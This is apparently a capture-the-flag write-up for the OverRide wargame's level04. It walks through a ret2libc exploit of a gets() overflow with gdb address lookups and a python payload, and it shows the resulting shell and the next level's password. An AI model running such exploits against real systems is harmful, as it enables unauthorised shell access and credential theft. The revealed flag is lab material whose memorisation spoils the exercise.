level04
=======
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
```

*	We have a [level04](src/level04) executable and here is the [code](src/level04.c)
	- no direct exploit
	- `gets(s)` seems vulnerable to ret2libc and shellcode
*	Trying to find the offset was a bit challenging because I had to do it the old way and reduce number one by one to finally ending up finding `156`
*	Now let's find what we need for `Ret2libc`
```console
(gdb) p system 
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
```
*	Let's try that :
```console
level04@OverRide:~$ python -c 'print("a"*156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])' > /tmp/level04
level04@OverRide:~$ cat /tmp/level04 - | ./level04 
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

